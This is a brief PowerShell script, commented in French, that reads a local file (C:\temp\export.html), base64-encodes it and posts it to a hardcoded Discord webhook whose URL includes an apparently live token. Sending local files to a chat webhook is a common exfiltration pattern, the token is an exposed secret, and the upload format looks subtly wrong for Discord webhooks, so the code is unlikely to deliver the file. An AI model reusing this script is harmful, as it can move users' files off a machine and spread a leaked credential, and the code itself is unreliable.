# Script PowerShell pour envoyer un fichier à un webhook Discord

# URL du webhook Discord
$webhookURL = "https://discord.com/api/webhooks/1248235803361017927/nr18FAB0OpvgVz4s4DIiKHyQeIjQGnGhqdYvwqmi_VKSMPN7AU0XRRWhDgzGg5i1h_-E"

# Chemin du fichier à envoyer
$filePath = "C:\temp\export.html"

# Vérifie si le fichier existe
if (Test-Path $filePath) {
    # Lis le fichier et convertit en base64
    $fileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filePath))

    # Crée le corps de la requête
    $body = @{
        "content" = "Here is the file:"
        "file" = @{
            "name" = [IO.Path]::GetFileName($filePath)
            "data" = $fileContent
        }
    } | ConvertTo-Json

    # Envoie la requête POST au webhook Discord
    Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType "application/json"
}
else {
    Write-Output "File not found"
}
